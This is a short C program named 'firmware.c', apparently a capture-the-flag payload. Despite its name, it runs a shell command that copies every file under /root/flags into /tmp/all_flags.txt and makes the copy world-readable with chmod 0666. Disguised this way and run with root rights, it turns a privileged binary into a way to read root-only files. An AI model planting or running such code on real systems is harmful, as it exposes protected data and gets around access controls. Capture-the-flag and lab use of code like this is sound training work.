// compile:
//   gcc -static -Os firmware.c -o firmware

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

int main()
{
    system("cat /root/flags/* > /tmp/all_flags.txt");
    chmod("/tmp/all_flags.txt", 0666);
    return 0;
}
